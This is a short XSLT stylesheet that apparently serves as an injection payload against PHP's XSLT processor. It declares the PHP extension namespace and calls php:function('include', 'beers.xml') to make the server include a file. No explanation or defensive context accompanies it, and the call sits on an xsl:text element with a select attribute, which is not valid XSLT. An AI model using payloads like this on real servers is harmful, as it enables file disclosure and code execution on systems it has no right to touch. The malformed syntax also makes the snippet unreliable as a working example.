<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:php="http://php.net/xsl">
<xsl:template match="/">
<xsl:text select="php:function('include', 'beers.xml')"/>
</xsl:template>
</xsl:stylesheet>
